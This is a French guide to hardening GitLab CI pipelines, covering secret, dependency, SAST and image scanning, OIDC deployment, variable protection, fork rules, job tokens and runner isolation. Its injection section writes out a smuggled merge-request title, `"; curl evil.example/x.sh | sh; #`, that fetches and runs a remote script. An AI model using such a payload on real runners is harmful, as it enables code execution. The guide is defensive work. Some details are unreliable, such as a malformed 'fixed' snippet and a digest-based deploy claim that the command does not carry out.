# GitLab CI durci

## Pipeline complet

```yaml
stages: [valider, scanner, construire, verifier-image, deployer]

variables:
  # Clonage superficiel : moins d'historique sur le runner, donc moins de secrets
  # historiques exposés en cas de compromission du job.
  GIT_DEPTH: "20"
  GIT_SUBMODULE_STRATEGY: none
  DOCKER_BUILDKIT: "1"
  # Digest calculé à la construction, réutilisé au déploiement.
  IMAGE: "$CI_REGISTRY_IMAGE"

default:
  # Image épinglée par digest : un tag est réattribuable.
  image: node:22-bookworm-slim@sha256:<digest>
  interruptible: true
  retry:
    max: 1
    when: [runner_system_failure, stuck_or_timeout_failure]

# ---------------------------------------------------------------- validation

lint:
  stage: valider
  script:
    - npm ci
    - npm run lint
    - npm test
  rules:
    - if: $CI_PIPELINE_SOURCE == 'merge_request_event'
    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH

# ------------------------------------------------------------------- scans

secrets:
  stage: scanner
  image:
    name: zricethezav/gitleaks:latest
    entrypoint: [""]
  variables:
    GIT_DEPTH: "0"        # l'historique complet est nécessaire ici
  script:
    - gitleaks detect --source . --redact --no-banner --report-path gitleaks.json
  artifacts:
    when: always
    paths: [gitleaks.json]
    expire_in: 1 week
  # Une fuite de secret bloque : elle ne se corrige pas plus tard.
  allow_failure: false

dependances:
  stage: scanner
  script:
    - npm ci
    - npm audit --audit-level=high
  allow_failure: false

sast:
  stage: scanner
  image:
    name: returntocorp/semgrep:latest
    entrypoint: [""]
  script:
    - semgrep --config=p/owasp-top-ten --config=p/secrets --error --json -o semgrep.json .
  artifacts:
    when: always
    paths: [semgrep.json]
    expire_in: 1 week

config:
  stage: scanner
  image:
    name: aquasec/trivy:latest
    entrypoint: [""]
  script:
    - trivy config --severity HIGH,CRITICAL --exit-code 1 .

# -------------------------------------------------------------- construction

build:
  stage: construire
  image:
    name: gcr.io/kaniko-project/executor:debug
    entrypoint: [""]
  script:
    # Kaniko construit sans démon Docker : pas besoin de runner privilégié
    # ni de montage du socket Docker.
    - /kaniko/executor
        --context "$CI_PROJECT_DIR"
        --dockerfile "$CI_PROJECT_DIR/Dockerfile"
        --destination "$IMAGE:$CI_COMMIT_SHA"
        --digest-file /tmp/digest
        --reproducible
    - echo "IMAGE_DIGEST=$(cat /tmp/digest)" >> build.env
  artifacts:
    reports:
      dotenv: build.env       # le digest passe aux jobs suivants
  rules:
    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH

scan-image:
  stage: verifier-image
  needs: [build]
  image:
    name: aquasec/trivy:latest
    entrypoint: [""]
  script:
    - trivy image --scanners vuln,secret --severity HIGH,CRITICAL --exit-code 1
        --format json --output trivy-image.json "$IMAGE@$IMAGE_DIGEST"
    - trivy image --format cyclonedx --output sbom.json "$IMAGE@$IMAGE_DIGEST"
  artifacts:
    when: always
    paths: [trivy-image.json, sbom.json]
    expire_in: 1 month
  rules:
    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH

# --------------------------------------------------------------- déploiement

deploy:prod:
  stage: deployer
  needs: [scan-image]
  # Fédération d'identité : aucun identifiant cloud stocké en variable.
  id_tokens:
    AWS_ID_TOKEN:
      aud: https://gitlab.exemple.tld
  image:
    name: amazon/aws-cli:2.17.0
    entrypoint: [""]
  before_script:
    - echo "$AWS_ID_TOKEN" > /tmp/oidc_token
    - export AWS_WEB_IDENTITY_TOKEN_FILE=/tmp/oidc_token
    - export AWS_ROLE_ARN="$AWS_DEPLOY_ROLE_ARN"
  script:
    # Déploiement PAR DIGEST : reproductible, et l'image déployée est
    # exactement celle qui a été scannée.
    - aws ecs update-service --cluster prod --service mon-app --force-new-deployment
  environment:
    name: production
    url: https://portail.exemple.tld
  resource_group: prod          # sérialise les déploiements concurrents
  rules:
    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH
      when: manual              # approbation humaine obligatoire
  tags: [runner-protege]        # runner dédié, non partagé
```

## Variables de CI

Trois attributs, tous nécessaires :

| Attribut | Effet | Conséquence si absent |
|---|---|---|
| **Masquée** | La valeur est remplacée dans les journaux | Le secret apparaît dans tout `echo` ou trace d'erreur |
| **Protégée** | Disponible seulement sur branches et tags protégés | Une branche quelconque, poussée par un contributeur, lit le secret |
| **Portée d'environnement** | Limitée à `production`, `staging`… | Un job de développement lit les identifiants de production |

Le masquage a des contraintes de format (longueur minimale, pas de caractères
interdits) : une valeur non conforme est acceptée **non masquée**, sans erreur.
Vérifier l'état effectif dans l'interface, pas l'intention.

Ne jamais stocker un secret dans `variables:` du fichier `.gitlab-ci.yml` : il est
commité et lisible par tout titulaire d'un accès en lecture.

Pour les secrets d'application, préférer l'intégration avec un coffre externe :

```yaml
deploy:
  secrets:
    DB_PASSWORD:
      vault: production/db/password@secrets
      file: false
```

## `rules` et contributions externes

`only`/`except` sont dépréciés — utiliser `rules`. Le point de sécurité : un
pipeline de merge request depuis un fork ne doit accéder à aucun secret.

```yaml
tests:
  script: [npm ci, npm test]
  rules:
    - if: $CI_PIPELINE_SOURCE == 'merge_request_event'
    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH

deploy:
  rules:
    # Uniquement sur la branche par défaut, jamais sur une merge request.
    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH && $CI_PIPELINE_SOURCE == 'push'
      when: manual
```

Les pipelines de merge request depuis un fork n'obtiennent pas les variables
protégées, à condition que celles-ci soient **effectivement** marquées protégées.
Ne jamais activer « exécuter les pipelines de merge request pour les forks avec le
contexte du projet » sans revue manuelle du diff.

## Injection dans un script

```yaml
# INTERDIT : le titre de la merge request est contrôlé par son auteur.
script:
  - echo "Déploiement de $CI_MERGE_REQUEST_TITLE"
```

Un titre valant `"; curl evil.example/x.sh | sh; #` s'exécute sur le runner.
Passer par l'environnement, où la valeur n'est jamais interprétée par le shell :

```yaml
script:
  - echo "Déploiement de ${TITRE}"
  variables:
    TITRE: $CI_MERGE_REQUEST_TITLE
```

Même précaution pour `$CI_COMMIT_BRANCH`, `$CI_COMMIT_MESSAGE`,
`$CI_MERGE_REQUEST_SOURCE_BRANCH_NAME` — tous contrôlables par le contributeur.

## Jeton de job

`CI_JOB_TOKEN` s'authentifie auprès du registre et de l'API du projet. Par défaut,
sa portée peut s'étendre à d'autres projets.

- Restreindre la liste d'autorisation du jeton de job aux projets réellement
  nécessaires (Paramètres → CI/CD → Permissions du jeton).
- Ne jamais l'utiliser pour une opération d'écriture qui devrait exiger une
  identité nominative.
- Un job compromis dispose du jeton : le périmètre du jeton **est** le périmètre
  du compromis.

## Runners

- Un runner partagé exécute les jobs de plusieurs projets : ne pas y placer les
  identifiants de production. Utiliser un runner dédié, étiqueté, restreint aux
  projets et branches protégés.
- `privileged = true` dans la configuration de l'exécuteur Docker donne un accès
  équivalent à root sur l'hôte à tout job qui y tourne. Construire les images avec
  Kaniko ou Buildah en mode non privilégié plutôt que par Docker-in-Docker.
- Le montage de `/var/run/docker.sock` dans un runner partagé permet à un job
  d'inspecter et de détourner les conteneurs des autres jobs.
- Cache et artefacts entre projets : un cache partagé est un canal d'exfiltration
  et d'empoisonnement. Cloisonner par projet.

## Scanners intégrés GitLab

Sur les éditions qui les incluent :

```yaml
include:
  - template: Security/SAST.gitlab-ci.yml
  - template: Security/Secret-Detection.gitlab-ci.yml
  - template: Security/Dependency-Scanning.gitlab-ci.yml
  - template: Security/Container-Scanning.gitlab-ci.yml
```

Ils produisent des rapports intégrés à l'interface de merge request. Attention :
par défaut ils **ne bloquent pas** la fusion. Le blocage se configure par une
politique d'approbation dédiée. Sans elle, les rapports sont informatifs — et une
alerte purement informative finit par ne plus être lue.

## Contrôle de la configuration effective

```bash
# Validation syntaxique du pipeline
glab ci lint

# Ce que le pipeline exécute réellement, includes et surcharges résolus :
# Interface → CI/CD → Éditeur de pipeline → onglet « Configuration complète »
```

Auditer la configuration résolue, pas le fichier source : les `include:` distants
peuvent changer sans commit dans le dépôt. Épingler les `include` par référence
fixe :

```yaml
include:
  - project: 'organisation/ci-templates'
    ref: 'v1.4.2'          # jamais 'main'
    file: '/templates/node.yml'
```
